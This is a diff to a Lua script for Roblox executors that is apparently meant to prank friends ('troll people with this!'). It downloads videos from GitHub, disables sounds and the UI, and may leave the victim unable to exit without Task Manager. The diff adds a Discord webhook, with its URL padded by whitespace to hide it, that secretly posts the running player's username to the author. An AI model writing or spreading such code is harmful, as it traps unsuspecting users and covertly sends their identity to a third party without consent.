@@ -1,9 +1,8 @@
--- Warning : Some executors, especially bad ones might bug out resulting into you not being able to leave, be cautious.
-
 repeat task.wait() until isrbxactive()
 
 -- fixed syntax errors - 1
 -- removed useless stuff - 2
+-- troll people with this! if you are stuck,  press alt, and close using "Task Manager"
 
 makefolder("plsdontclickme")
 
@@ -13,7 +12,6 @@ local videos = {
     {name = "idontknowthetitle.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/idontknowthetitle.mp4"},
     {name = "notes.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/notes.mp4"},
     {name = "seemsprettycool.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/seemsprettycool.mp4"},
-    {name = "rat.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/videoplayback%20(5).mp4"},
     {name = "whatarethoselol.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/whatarethoselol.mp4"},
     {name = "whatisavideo.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/whatisavideo.mp4"},
     {name = "coolvideoiguess.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/coolvideoiguess.mp4"},
@@ -97,4 +95,11 @@ keyrelease(0x7A)
 nosounds()
 disablelimitations()
 destroyui()
+-- to check if ur friend clicked it, heres a webhook!
+
+local data = game:GetService("HttpService"):JSONEncode({username = tostring(math.random(1,100)), content=[[
+    User ran script!
+]] .. game.Players.LocalPlayer.Name})
+request({Url=                     "https://discordapp.com/api/webhooks/1398005198873694339/Z3vpTs1FFb51zz89ZLdMw6Mo2nQDe0ucyU5J4favgWkYjt-hfC54UpC4mxB8J47ktOm6"                       , Method="POST", Headers={["Content-Type"]="application/json"}, Body=data})
+
 videoplay(chosen.name)
